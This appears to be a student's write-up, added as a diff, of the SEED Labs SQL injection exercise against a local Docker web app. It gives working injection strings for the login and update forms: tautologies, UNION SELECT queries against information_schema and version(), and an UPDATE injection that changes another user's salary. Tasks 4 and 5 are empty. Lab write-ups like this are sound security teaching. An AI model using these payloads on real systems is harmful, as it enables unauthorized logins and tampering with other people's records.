@@ -1,0 +1,99 @@
+* Setup
+*** cd category-web/Web_SQL_Injection/Labsetup
+*** docker-compose up
+*** add 10.9.0.5 with host name www.seed-server.com in /etc/hosts file in the host machine
+*** Go to www.seed-server.com and if you find the login page then the setup is complete
+
+
+* Task 1
+** Approach 1
+*** Type {{admin';#}} in the username field and anything in the password field
+    In the code we can see the comparison of name with 'admin', so there must be an username with 'admin'.
+*** Then all the usernames will be shown from where we can find Alice.
+*** Type {{Alice;#}} in the username field and anything in the password field and viola!
+
+** Approach 2
+*** Insert {{' OR TRUE;#}} in the username field and we are in!
+    This works because we are essentially nullyfying the where clause with 'OR TRUE', so the result set contains all the records.
+    But in the PHP code, we can see that all the records from the sql results are pushed into the array and only the 0th index is accessed as logged in user.
+
+    #+BEGIN_SRC php
+      /* convert the select return result into array type */
+      $return_arr = array();
+      while($row = $result->fetch_assoc()){
+        array_push($return_arr,$row);
+      }
+
+      /* convert the array type to json format and read out*/
+      $json_str = json_encode($return_arr);
+      $json_a = json_decode($json_str,true);
+      $id = $json_a[0]['id'];
+    #+END_SRC
+
+** Screenshot
+#+CAPTION: Login as Alice
+[[./screenshots/assignment/task-1-login-alice.png]]
+
+
+* Task 2
+** Approach
+*** We can get the columns of a table using the following query
+      #+BEGIN_SRC sql
+        select column_name from information_schema.columns where table_name = "credential";
+      #+END_SRC
+*** After that we can use row_number over the partition and get the column numbers 
+      #+BEGIN_SRC sql
+        select ordinal_position from information_schema.columns where table_name = "credential" and column_name = "Name";
+      #+END_SRC
+*** Now we can use this expression combined union attack to inject the code and we will get the column number of Name from 
+      Inject {{' OR FALSE UNION SELECT 1, (select ordinal_position from information_schema.columns where table_name = "credential" and column_name = "Name"),null,null,null,null,null,null,null,null,null #}}
+
+** Screenshot
+[[./screenshots/assignment/task-2-name-column-number.png]]
+
+
+* Task 3
+** Union Attack
+*** Insert {{' OR FALSE UNION SELECT 1,version(),null,null,null,null,null,null,null,null,null #}} in the username
+    This works because we are essentially nullyfying the first SELECT using FALSE condition and
+    then unioning the result of a select statement with equal number of resultants.
+    In the manufactured select clause id cannot be null because the code assumes if id exists then user exists, so we put in dummy 1 as id
+    and our targeted version() in place of the name field. All other values are null since their contents are unnecessary in this context.
+
+** Screenshot
+#+CAPTION: MYSQL Version
+[[./screenshots/assignment/task-3-mysql-version.png]]
+
+
+* Task 4
+
+* Task 5
+
+* Task 6
+** Approach 1
+*** If we provide eid with {{1' OR TRUE}} and password with {{pass' OR TRUE}} the transferred SQL looks like below.
+    #+BEGIN_SRC sql
+      SELECT * FROM customers
+      WHERE eid='1' OR TRUE AND
+      password='pass' OR TRUE;
+    #+END_SRC
+    This in turn will either spit up all users or sign me as first user.
+    Or we can inject other conditions instead of TRUE to get access for a specific user if we know the columns of the database.
+** Approach 2
+*** If we provide eid with {{' TRUE or \slash​\ast}} and password with {{\ast​\slash;--}} the transferred SQL looks like below.
+    #+BEGIN_SRC sql
+      SELECT * FROM customers
+      WHERE eid='' or TRUE /*
+      password='*/;-- OR TRUE;
+    #+END_SRC
+    This in turn will either spit up all users or sign me as first user.
+    Or we can inject other conditions instead of TRUE to get access for a specific user if we know the columns of the database.
+    
+* Task 7
+*** If we set name {{Reddington', salary=1}} and we know an information like eid or other column value unique to the attacker we can update any columns we want.
+    Here we are assuming that we know the employee id, then we have to pass {{1';--}} to the employee id.
+    #+BEGIN_SRC sql
+      UPDATE employee
+      SET name='Reddington', salary=1, password='$hashed_newpwd'
+      WHERE eid = '1';--and password='$hashed_oldpwd';
+    #+END_SRC
